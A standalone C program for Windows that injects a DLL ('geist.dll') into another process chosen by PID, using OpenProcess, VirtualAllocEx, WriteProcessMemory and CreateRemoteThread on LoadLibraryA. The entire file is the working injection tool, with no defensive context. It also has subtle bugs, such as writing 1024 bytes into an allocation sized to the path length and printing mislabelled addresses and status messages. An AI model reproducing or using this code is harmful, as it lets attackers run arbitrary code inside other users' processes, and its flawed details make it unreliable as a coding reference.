#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
	HANDLE hProcess = NULL, hThread = NULL;
	HMODULE hModule = NULL;
	LPVOID pLoadLibrary = NULL;
	LPVOID pBuffer = NULL;
	int PID = atoi(argv[1]);
	char geistDLL[1024] = "C:\\Path\\to\\geist.dll";
	size_t pathSize = sizeof(geistDLL);

	// Open handle to our DLL//
	
	printf("[*] Opening a handle to the library...\n");

	hProcess = OpenProcess(
	PROCESS_ALL_ACCESS,
	FALSE,
	PID);

	if (!hProcess){
	printf("[-] Failed to open process ");
	return EXIT_FAILURE;
	}

	printf("[+] Process created successfully");
	printf(" \n");

	// Open a handle to the DLL module //
	hModule = GetModuleHandleW(L"kernel32.dll");

	if (!hModule){
	printf("[-] Failed to open a handle to the module");
	return EXIT_FAILURE;
	}

	printf("[+] Module handle opened successfully");
	printf(" \n");

	// Retrieve address of the DLL //
	
	printf("[*] Fetching address of library...\n");

	pLoadLibrary = (LPVOID)GetProcAddress(hModule, "LoadLibraryA");

	if (!pLoadLibrary){
	printf("[-] Failed to get address");
	return EXIT_FAILURE;
	}

	printf("[+] Library address %p\n", hModule);
	printf(" \n");

	// Allocate memory for the DLL //

	printf("[*] Allocating memory inside target process...");

	pBuffer = VirtualAllocEx(
	hProcess,
	NULL,
	strlen(geistDLL),
	MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE	
	);

	if (!pBuffer){
	printf("[-] Failed to allocate memory\n");
	return EXIT_FAILURE;
	}

	printf("[+] Memory allocated successfully");
	printf(" \n");

	// Write our DLL into the process //
	
	printf("[*] Writing DLL into target process...\n");

	if (!WriteProcessMemory(
	hProcess,
	pBuffer,
	geistDLL,
	pathSize,
	NULL
	)){
	printf("[-] Failed to write DLL into process");
	return EXIT_FAILURE;
	}

	printf("[+] DLL written successfully\n");
	printf(" \n");

	// Execute the DLL //

	printf("[*] Executing DLL...\n");

	hThread = CreateRemoteThread(
	hProcess,
	NULL,
	0,
	(LPTHREAD_START_ROUTINE)pLoadLibrary,
	pBuffer,
	0,
	NULL
	);

	if (!hThread){
	printf("[-] Failed to execute DLL\n");
	return EXIT_FAILURE;
	}

	printf("[+] DLL executed successfully\n");
	printf(" \n");
		
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
